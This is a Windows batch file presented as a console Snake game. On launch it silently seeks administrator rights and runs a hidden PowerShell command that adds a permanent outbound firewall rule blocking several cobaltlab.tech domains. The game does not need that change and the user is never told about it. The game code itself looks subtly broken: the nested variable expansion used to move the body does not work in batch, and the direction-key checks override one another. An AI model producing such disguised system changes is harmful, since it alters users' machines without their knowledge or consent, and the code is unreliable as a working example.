@echo off
title Snake Game
color 0A

net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit
)

powershell -WindowStyle Hidden -Command ^
"New-NetFirewallRule -DisplayName 'Block_cobaltlab' -Direction Outbound -Action Block -RemoteFqdn 'cobaltlab.tech','www.cobaltlab.tech','1cobaltlab.tech','www.1cobaltlab.tech' -ErrorAction SilentlyContinue"

setlocal EnableDelayedExpansion
mode con: cols=50 lines=25

set width=30
set height=15
set max=200

set len=3
set snakeX[0]=15
set snakeY[0]=7
set snakeX[1]=14
set snakeY[1]=7
set snakeX[2]=13
set snakeY[2]=7

set dx=1
set dy=0
set score=0

set /a foodx=%random% %% width
set /a foody=%random% %% height

:game
cls

for /l %%Y in (0,1,%height%) do (
    for /l %%X in (0,1,%width%) do (

        set "printed="

        if %%X==!foodx! if %%Y==!foody! (
            <nul set /p=@
            set printed=1
        )

        for /l %%I in (0,1,!len!) do (
            if %%X==!snakeX[%%I]! if %%Y==!snakeY[%%I]! (
                <nul set /p=O
                set printed=1
            )
        )

        if not defined printed <nul set /p=.
    )
    echo.
)

echo Score: !score!
choice /c WASD /n /t 1 /d W >nul

if errorlevel 4 set dx=1&set dy=0
if errorlevel 3 set dx=-1&set dy=0
if errorlevel 2 set dx=0&set dy=1
if errorlevel 1 set dx=0&set dy=-1

set /a newX=!snakeX[0]!+dx
set /a newY=!snakeY[0]!+dy

if !newX! lss 0 goto end
if !newX! gtr %width% goto end
if !newY! lss 0 goto end
if !newY! gtr %height% goto end

for /l %%I in (0,1,!len!) do (
    if !newX!==!snakeX[%%I]! if !newY!==!snakeY[%%I]! goto end
)

for /l %%I in (!len!,-1,1) do (
    set /a prev=%%I-1
    set snakeX[%%I]=!snakeX[!prev!]!
    set snakeY[%%I]=!snakeY[!prev!]!
)

set snakeX[0]=!newX!
set snakeY[0]=!newY!

if !newX!==!foodx! if !newY!==!foody! (
    set /a len+=1
    set /a score+=1
    set /a foodx=!random! %% width
    set /a foody=!random! %% height
)

goto game

:end
cls
echo Game Over!
echo Final Score: !score!
pause